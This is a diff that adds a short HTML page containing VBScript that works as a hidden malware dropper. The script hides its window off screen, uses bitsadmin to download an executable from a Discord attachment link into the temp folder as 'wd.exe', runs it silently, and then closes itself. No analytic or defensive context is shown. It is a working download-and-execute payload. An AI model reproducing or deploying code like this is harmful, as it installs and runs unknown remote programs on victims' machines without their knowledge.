@@ -1,0 +1,15 @@
+<html><body><script language="VBScript">
+Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
+
+Dim shell: Set shell = CreateObject("WScript.Shell")
+Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
+Dim temp: temp = fso.GetSpecialFolder(2)
+
+shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1523543476065669130/1523560647772868710/navi.exe?ex=6a4c8dec&is=6a4b3c6c&hm=f7fa067b1e092c2fc812ae9222740ca57d1c5b37b76eaa0f88d90b5ca09bf947&"" """ & temp & "\wd.exe""", 0, True
+
+If fso.FileExists(temp & "\wd.exe") Then
+    shell.Run """" & temp & "\wd.exe""", 0, False
+End If
+
+window.close()
+</script></body></html>
